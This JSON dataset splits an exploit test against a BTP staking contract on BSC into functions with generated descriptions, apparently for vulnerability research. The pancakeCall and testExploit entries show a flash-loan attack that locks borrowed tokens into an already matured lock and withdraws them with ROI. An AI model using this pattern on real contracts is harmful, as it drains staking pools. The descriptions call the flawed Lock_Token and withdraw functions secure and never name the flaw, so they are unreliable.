[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": "1. **Core functions:**  \nThis function is designed to provide a list of artifacts (items or elements) that are excluded from certain processes or operations within the smart contract. It simply retrieves and returns the stored list of excluded artifacts.\n\n2. **Security mechanism:**  \nThe function uses the `public` modifier, meaning it can be called by anyone, and the `view` modifier, which ensures that the function does not modify the state of the contract, making it safe to call without incurring gas costs or risking unintended changes.\n\n3. **Parameter Function:**  \nThe function does not take any parameters. It solely focuses on returning the list of excluded artifacts stored in the contract.\n\n4. **Return description:**  \nThe function returns an array of strings (`string[] memory`) representing the excluded artifacts. The value returned is directly taken from the `_excludedArtifacts` variable, which is assumed to be a predefined list within the contract.\n\n**In summary,**  \nThis function is a simple read-only utility that retrieves and returns a list of excluded artifacts from the contract. It is safe to call and does not require any input parameters."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": "1. Core functions:  \nThis function is designed to provide a list of contract addresses that are excluded from certain operations or rules within the smart contract. It acts as a simple retrieval tool, allowing anyone to view the addresses that have been marked as excluded.\n\n2. Security mechanism:  \nThe function uses the `view` modifier, which ensures that it does not modify the state of the contract. This means it only reads data and does not perform any actions that could alter the contract's state. Additionally, since it is marked as `public`, it can be called by anyone, but its read-only nature prevents any unauthorized changes.\n\n3. Parameter Function:  \nThis function does not take any parameters. It simply retrieves and returns the list of excluded contract addresses stored in the `_excludedContracts` variable.\n\n4. Return description:  \nThe function returns an array of addresses (`address[] memory excludedContracts_`) that represent the contracts excluded from specific operations. The output is directly taken from the `_excludedContracts` variable, which is presumably maintained and updated elsewhere in the contract.\n\nIn summary, this function serves as a straightforward way to access and view the list of excluded contract addresses, ensuring transparency while maintaining security through its read-only design."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": "1. Core functions:  \nThis function is designed to provide a list of addresses that are excluded from certain operations or restrictions within the smart contract. It simply retrieves and returns the stored list of excluded addresses.\n\n2. Security mechanism:  \nThe function uses the `view` modifier, which ensures that it does not modify the state of the contract. This makes it safe to call without incurring gas costs or risking unintended changes to the contract's data.\n\n3. Parameter Function:  \nThis function does not take any parameters. It operates solely on the internal state of the contract to fetch the list of excluded addresses.\n\n4. Return description:  \nThe function returns an array of addresses (`excludedSenders_`) that are stored in the `_excludedSenders` variable. The output is a direct copy of this stored list, providing transparency about which addresses are excluded.\n\nIn summary, this function is a simple and secure way to retrieve a list of excluded addresses from the contract, ensuring no state changes occur during the process."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": "1. **Core functions:**  \n   The `failed()` function checks whether a failure condition has occurred. It first looks at a stored variable `_failed` to see if it is set to `true`. If `_failed` is not set, it then checks a specific value stored in a virtual machine (VM) at a predefined location. If either of these conditions indicates a failure, the function returns `true`; otherwise, it returns `false`.\n\n2. **Security mechanism:**  \n   The function uses the `view` modifier, which ensures that it does not modify the state of the contract, making it safe to call without incurring gas costs or altering data. Additionally, it relies on a VM's storage to retrieve the failure status, which adds a layer of abstraction and security by isolating the failure state from the contract's main storage.\n\n3. **Parameter Function:**  \n   The function does not take any parameters. It operates solely based on internal state (`_failed`) and external VM storage, making it a straightforward check without requiring input from the caller.\n\n4. **Return description:**  \n   The function returns a boolean value (`true` or `false`). It first checks if `_failed` is `true` and returns that value if it is. If `_failed` is not set, it retrieves a value from the VM's storage using a specific key (`\"failed\"`). If the retrieved value is not zero, it returns `true`, indicating a failure. Otherwise, it returns `false`, meaning no failure has been detected.\n\n**In summary,**  \nThe `failed()` function is a simple yet effective way to check for a failure condition by examining both an internal state variable and an external VM storage value. It is designed to be safe and cost-efficient, ensuring that it only reads data without making any changes to the contract."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        BTP.approve(address(Staking), type(uint256).max);\n        Staking.Lock_Token(1, BTP.balanceOf(address(this)));\n        Staking.withdraw(1);\n        BTP.transfer(msg.sender, flashAmount * 10_000 / 9975 + 1000);\n    }\n",
    "description": "1. Core functions:  \nThis function is designed to handle a specific type of transaction called a \"flash loan\" in a decentralized finance (DeFi) system. It performs three main tasks:  \n- Approves the maximum possible amount of a token (BTP) to be used by a staking contract.  \n- Locks the available balance of the BTP token in the staking contract.  \n- Withdraws the locked tokens and transfers a calculated amount of BTP tokens back to the caller (msg.sender).  \n\n2. Security mechanism:  \n- The function uses `external`, which means it can only be called from outside the contract, ensuring it cannot be invoked internally.  \n- The `approve` function sets the maximum allowance for the staking contract, ensuring it has sufficient permissions to interact with the BTP token.  \n- The `transfer` function ensures that the calculated amount of tokens is sent back to the caller, completing the flash loan process.  \n\n3. Parameter Function:  \n- `sender`: Represents the address initiating the transaction.  \n- `amount0` and `amount1`: Likely represent amounts of tokens involved in the transaction, though they are not directly used in this function.  \n- `data`: Additional information passed to the function, which is not utilized in this specific implementation.  \n\n4. Return description:  \nThe function does not return a value directly. Instead, it performs calculations to determine the amount of BTP tokens to transfer back to the caller. The formula `flashAmount * 10_000 / 9975 + 1000` adjusts the `flashAmount` to account for a small fee or margin, ensuring the caller receives the correct amount after the transaction.  \n\nIn summary, this function manages a flash loan by approving, locking, and transferring tokens while ensuring the caller receives the adjusted amount. It uses basic security measures to control access and permissions."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_176_675);\n    }\n\n",
    "description": "1. **Core functions:**  \n   The `setUp` function is designed to prepare the environment for testing or executing a specific task. It uses a helper tool (`cheats.createSelectFork`) to create a simulated version of a blockchain (in this case, the Binance Smart Chain or \"bsc\") at a specific block number (28,176,675). This allows the code to interact with a snapshot of the blockchain as it existed at that block, which is useful for testing or debugging purposes.\n\n2. **Security mechanism:**  \n   The function is marked as `public`, meaning it can be called by anyone. However, since this is likely a setup function for testing, it doesn’t include additional security measures like access control. In a production environment, such a function would typically include restrictions to prevent unauthorized use. Here, the focus is on creating a controlled environment for testing rather than securing the function itself.\n\n3. **Parameter Function:**  \n   The function does not take any parameters. It relies on hardcoded values: the blockchain identifier (`\"bsc\"`) and the block number (`28_176_675`). These values are used to specify which blockchain and which point in its history to simulate.\n\n4. **Return description:**  \n   The function does not return any value. Its purpose is to set up the environment by creating a fork of the blockchain at the specified block number. Once executed, the environment is ready for further testing or operations.\n\n**In summary,**  \nThe `setUp` function prepares a testing environment by simulating a specific state of the Binance Smart Chain at a given block number. It is a public function with no parameters or return value, primarily used for testing purposes."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": "1. Core functions:  \nThis function is designed to provide a list of specific selectors (identifiers) for artifacts that are targeted for testing or fuzzing. It essentially retrieves and returns the stored list of these selectors, allowing external users or systems to access them.\n\n2. Security mechanism:  \nThe function uses the `view` modifier, which ensures that it does not modify the state of the contract. This prevents any unintended changes to the contract's data. Additionally, since it only reads and returns data, it reduces the risk of exposing sensitive information or vulnerabilities.\n\n3. Parameter Function:  \nThis function does not take any parameters. It simply accesses and returns the stored list of targeted artifact selectors.\n\n4. Return description:  \nThe function returns an array of `FuzzSelector` objects, which represent the selectors for the targeted artifacts. The return value is directly fetched from the internal storage variable `_targetedArtifactSelectors`, ensuring that the output is consistent with the stored data.\n\nIn summary, this function is a straightforward utility that retrieves and returns a list of targeted artifact selectors without altering the contract's state, ensuring both functionality and security."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": "1. **Core functions**:  \n   This function is designed to retrieve and return a list of targeted artifacts. It acts as a simple getter function, allowing users to view the stored list of artifacts without making any changes to the contract's state.\n\n2. **Security mechanism**:  \n   The function uses the `view` modifier, which ensures that it only reads data from the contract and does not modify any state. This prevents unintended changes to the contract's data. Additionally, the function is marked as `public`, meaning it can be accessed by anyone, but since it only reads data, it poses no security risk.\n\n3. **Parameter Function**:  \n   This function does not take any parameters. It directly accesses the internal storage variable `_targetedArtifacts` to retrieve the list of targeted artifacts.\n\n4. **Return description**:  \n   The function returns the value of the internal storage variable `_targetedArtifacts`, which is a list of strings. The returned value is a copy of this list, allowing users to view the targeted artifacts without affecting the original data.\n\nIn summary, this function is a simple, read-only getter that provides access to a list of targeted artifacts stored in the contract. It ensures security by not modifying any state and is accessible to all users."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": "1. **Core functions:**  \n   This function is designed to retrieve and return a list of contract addresses that are being targeted or monitored. It provides a way to access the stored addresses without modifying them, making it a read-only operation.\n\n2. **Security mechanism:**  \n   The function uses the `view` modifier, which ensures that it does not alter the state of the contract. This prevents any unintended changes to the data. Additionally, since it only reads from the `_targetedContracts` variable, it does not expose any sensitive operations or vulnerabilities.\n\n3. **Parameter Function:**  \n   This function does not take any parameters. It simply accesses the internal `_targetedContracts` variable, which is assumed to be a list of addresses stored within the contract.\n\n4. **Return description:**  \n   The function returns the entire list of addresses stored in the `_targetedContracts` variable. The output is an array of addresses, which represents the contracts that are being targeted or monitored by this function.\n\n**In summary,**  \nThis function is a straightforward utility that provides read-only access to a list of targeted contract addresses. It ensures security by not allowing any modifications to the data and simply returns the stored information."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": "1. **Core functions:**  \n   This function is designed to provide a list of interfaces that are being targeted or focused on within the smart contract. It acts as a simple retrieval mechanism, allowing users or other parts of the system to access the stored list of interfaces without modifying them.\n\n2. **Security mechanism:**  \n   The function uses the `view` modifier, which ensures that it does not alter the state of the contract. This means it only reads data and cannot make any changes, making it safe to call without risking unintended side effects. Additionally, the function is marked as `public`, meaning it can be accessed by anyone, but since it only reads data, this does not pose a security risk.\n\n3. **Parameter Function:**  \n   This function does not take any parameters. It is a straightforward retrieval function that does not require any input to perform its task.\n\n4. **Return description:**  \n   The function returns an array of `FuzzInterface` objects, which represent the interfaces being targeted. The value returned is directly taken from the internal storage variable `_targetedInterfaces`, meaning it simply provides a copy of the stored list without any additional processing or calculation.\n\n**In summary,**  \nThis function is a simple and secure way to retrieve a list of targeted interfaces stored in the contract. It does not modify any data and does not require any input, making it safe and easy to use."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": "1. Core functions:  \nThis function is designed to provide a list of specific selectors that are targeted for testing or fuzzing. It acts as a simple retrieval mechanism, allowing users to access the stored selectors without modifying them.\n\n2. Security mechanism:  \nThe function includes the `view` modifier, which ensures that it does not alter the state of the contract. This prevents any unintended changes to the data. Additionally, since it only reads and returns data, it minimizes the risk of security vulnerabilities.\n\n3. Parameter Function:  \nThe function does not take any parameters, meaning it operates solely based on the internal state of the contract. It relies on the predefined `_targetedSelectors` array to provide the output.\n\n4. Return description:  \nThe function returns an array of `FuzzSelector` elements stored in the `_targetedSelectors` variable. The output is a direct copy of this internal array, providing the caller with the list of targeted selectors.\n\nIn summary, this function is a straightforward tool for retrieving a list of targeted selectors, ensuring no state changes occur during its execution."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": "1. **Core functions:**  \n   This function is designed to retrieve and return a list of addresses that have been marked as \"targeted senders.\" It provides a way to view these addresses without making any changes to the contract's state.\n\n2. **Security mechanism:**  \n   The function uses the `view` modifier, which ensures that it only reads data from the contract and does not modify it. This prevents any unintended changes to the contract's state. Additionally, since it is marked as `public`, it can be accessed by anyone, but the `view` modifier ensures it remains read-only.\n\n3. **Parameter Function:**  \n   This function does not take any parameters. It simply accesses and returns the stored list of targeted sender addresses.\n\n4. **Return description:**  \n   The function returns an array of addresses (`address[] memory`) stored in the `_targetedSenders` variable. The output is a direct copy of this list, allowing users to see which addresses are currently marked as targeted senders.\n\n**In summary,**  \nThis function is a straightforward read-only tool that provides access to a list of addresses marked as targeted senders. It ensures security by preventing any modifications to the contract's state and does not require any input parameters. The returned value is a direct copy of the stored address list."
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        firstLock();\n\n        cheats.warp(block.timestamp + 6 * 30 * 24 * 60 * 60 + 1000); // lock 6 month\n\n        Pair.swap(flashAmount, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"Attacker BTP balance after exploit\", BTP.balanceOf(address(this)), BTP.decimals());\n    }\n\n",
    "description": "1. **Core functions**:  \n   The `testExploit` function is designed to simulate an exploit scenario. It first calls the `firstLock` function, which likely sets up some initial conditions. Then, it manipulates the blockchain's timestamp to simulate a time jump of approximately 6 months and 1000 seconds. After this, it triggers a swap operation using the `Pair.swap` function, which is likely part of a decentralized exchange or liquidity pool. Finally, it logs the attacker's balance of a specific token (BTP) after the exploit, showing the result of the simulated attack.\n\n2. **Security mechanism**:  \n   The function does not explicitly include security mechanisms like access control or input validation. However, the use of `cheats.warp` suggests it might be part of a testing environment (e.g., using a tool like Foundry) where such manipulations are allowed for testing purposes. The function emits an event to log the attacker's balance, which could be useful for debugging or monitoring.\n\n3. **Parameter Function**:  \n   The `Pair.swap` function takes four parameters:  \n   - `flashAmount`: The amount of tokens to swap.  \n   - `0`: Likely represents the minimum amount of output tokens expected from the swap.  \n   - `address(this)`: The address of the contract executing the swap, which is the attacker in this case.  \n   - `new bytes(1)`: A placeholder for additional data, which is not used here.  \n\n4. **Return description**:  \n   The function does not return any value directly. Instead, it emits an event (`log_named_decimal_uint`) that logs the attacker's balance of the BTP token after the exploit. The balance is calculated by calling `BTP.balanceOf(address(this))`, which retrieves the BTP token balance of the contract (attacker) and formats it using the token's decimal precision.\n\n**In summary**,  \nThe `testExploit` function simulates an exploit by manipulating time, executing a swap, and logging the attacker's token balance. It is likely used in a testing environment to study the effects of such an attack."
  },
  {
    "contract/interface": "IStaking",
    "source_type": "victim_contract",
    "function_name": "Lock_Token",
    "original_code": "    function Lock_Token(uint256 plan, uint256 _amount) external {\n      if(plan == 1) {\n          address contractAddress = address(this);\n          uint256 currentAmount = sixMonth[msg.sender].amount;\n          uint256 total = SafeMath.add(currentAmount,_amount);\n          if(sixMonth[msg.sender].reinvest == 0) {\n          uint256 startTime = block.timestamp;\n          uint256 endTime = block.timestamp + 180 days;\n          sixMonth[msg.sender] = TimeLock_Six_Month(msg.sender,total,startTime,endTime,1);\n          }\n          else {\n              uint256 startTime = sixMonth[msg.sender].start_time;\n              uint256 endTime = sixMonth[msg.sender].end_time;\n              sixMonth[msg.sender] = TimeLock_Six_Month(msg.sender,total,startTime,endTime,1);\n          }\n          ERC20interface.transferFrom(msg.sender, contractAddress, _amount);\n      }\n      else if(plan == 2) {\n          address contractAddress = address(this);\n          uint256 currentAmount = nineMonth[msg.sender].amount;\n          uint256 total = SafeMath.add(currentAmount,_amount);\n           if(nineMonth[msg.sender].reinvest == 0) {\n          uint256 startTime = block.timestamp;\n          uint256 endTime = block.timestamp + 270 days;\n          nineMonth[msg.sender] = TimeLock_Nine_Month(msg.sender,total,startTime,endTime,1);\n           }\n           else {\n              uint256 startTime = nineMonth[msg.sender].start_time;\n              uint256 endTime = nineMonth[msg.sender].end_time;\n              nineMonth[msg.sender] = TimeLock_Nine_Month(msg.sender,total,startTime,endTime,1);\n           }\n          ERC20interface.transferFrom(msg.sender, contractAddress, _amount);\n      }\n      else if(plan == 3) {\n          address contractAddress = address(this);\n          uint256 currentAmount = twelveMonth[msg.sender].amount;\n          uint256 total = SafeMath.add(currentAmount,_amount);\n          if(twelveMonth[msg.sender].reinvest == 0) {\n          uint256 startTime = block.timestamp;\n          uint256 endTime = block.timestamp + 365 days;\n          twelveMonth[msg.sender] = TimeLock_Twelve_Month(msg.sender,total,startTime,endTime,1);\n          }\n          else {\n              uint256 startTime = twelveMonth[msg.sender].start_time;\n              uint256 endTime = twelveMonth[msg.sender].end_time;\n              twelveMonth[msg.sender] = TimeLock_Twelve_Month(msg.sender,total,startTime,endTime,1);\n          }\n          ERC20interface.transferFrom(msg.sender, contractAddress, _amount);\n      }\n    }\n\n",
    "description": "1. **Core functions:**  \n   The `Lock_Token` function is designed to lock a specified amount of tokens for a specific period based on the chosen plan. There are three plans available: 6 months, 9 months, and 12 months. The function checks the selected plan and updates the user's locked token details accordingly. If the user is locking tokens for the first time, it sets a new start and end time. If the user is adding more tokens to an existing lock, it retains the original start and end times. Finally, the function transfers the specified amount of tokens from the user's account to the contract's address.\n\n2. **Security mechanism:**  \n   - The function uses `external` visibility, meaning it can only be called from outside the contract, ensuring internal state changes are controlled.  \n   - It employs `SafeMath` for arithmetic operations to prevent overflow or underflow issues.  \n   - The function ensures that the token transfer is executed only after updating the lock details, maintaining consistency.  \n\n3. **Parameter Function:**  \n   - `plan`: Determines the duration for which the tokens will be locked (6 months, 9 months, or 12 months).  \n   - `_amount`: Specifies the number of tokens to be locked.  \n\n4. **Return description:**  \n   The function does not return any value. Its primary purpose is to update the user's locked token details and transfer tokens to the contract.  \n\n**In summary,**  \nThe `Lock_Token` function locks tokens for a specified duration based on the chosen plan. It updates the user's lock details and transfers tokens to the contract securely, using measures like `SafeMath` to prevent arithmetic errors."
  },
  {
    "contract/interface": "IStaking",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint256 _plan) public {\n        if(_plan == 1) {\n        require(block.timestamp >= sixMonth[msg.sender].end_time, \"You cant unstake now\");\n        uint256 roi = sixMonth[msg.sender].amount;\n        uint256 RoiReturn = plan_1_Roi(roi);\n        uint256 investedAmount = sixMonth[msg.sender].amount;\n        uint256 total = SafeMath.add(RoiReturn,investedAmount);\n        ERC20interface.transfer(msg.sender, total);\n\n        sixMonth[msg.sender] = TimeLock_Six_Month(msg.sender,0,0,0,0);\n         }\n\n        else if(_plan == 2) {\n        require(block.timestamp >= nineMonth[msg.sender].end_time, \"You cant unstake now\");\n        uint256 roi = nineMonth[msg.sender].amount;\n        uint256 RoiReturn = plan_2_Roi(roi);\n        uint256 investedAmount = nineMonth[msg.sender].amount;\n        uint256 total = SafeMath.add(RoiReturn,investedAmount);\n        ERC20interface.transfer(msg.sender, total);\n        nineMonth[msg.sender] = TimeLock_Nine_Month(msg.sender,0,0,0,0);\n         }\n\n         else if(_plan == 3) {\n        require(block.timestamp >= twelveMonth[msg.sender].end_time, \"You cant unstake now\");\n        uint256 roi = twelveMonth[msg.sender].amount;\n        uint256 RoiReturn = plan_3_Roi(roi);\n        uint256 investedAmount = twelveMonth[msg.sender].amount;\n        uint256 total = SafeMath.add(RoiReturn,investedAmount);\n        ERC20interface.transfer(msg.sender, total);\n\n        twelveMonth[msg.sender] = TimeLock_Twelve_Month(msg.sender,0,0,0,0);\n         }\n    }\n\n",
    "description": "1. Core functions:  \nThis function allows users to withdraw their funds based on a specific investment plan they chose. It checks the plan type (1, 2, or 3) and ensures that the withdrawal is only possible after the investment period has ended. If the conditions are met, it calculates the return on investment (ROI) and the total amount to be returned, then transfers the funds to the user. Finally, it resets the user's investment details for that plan.\n\n2. Security mechanism:  \nThe function uses `require` statements to ensure that withdrawals can only happen after the investment period has ended, preventing early access to funds. It also uses `SafeMath` for arithmetic operations to avoid overflow or underflow issues. Additionally, the function resets the user's investment details after withdrawal, ensuring no leftover data can be misused.\n\n3. Parameter Function:  \nThe function takes one parameter, `_plan`, which represents the investment plan the user selected (1, 2, or 3). This parameter determines which investment details to check and how to calculate the ROI and total amount to be returned.\n\n4. Return description:  \nThe function does not return a value directly. Instead, it calculates the total amount to be returned by adding the ROI (calculated using specific plan functions like `plan_1_Roi`, `plan_2_Roi`, or `plan_3_Roi`) to the original invested amount. This total is then transferred to the user's wallet.\n\nIn summary,  \nThis function enables users to withdraw their funds after their investment period ends, ensuring security through checks and safe calculations. It uses the `_plan` parameter to determine the correct investment details and calculates the total amount to be returned based on the chosen plan."
  }
]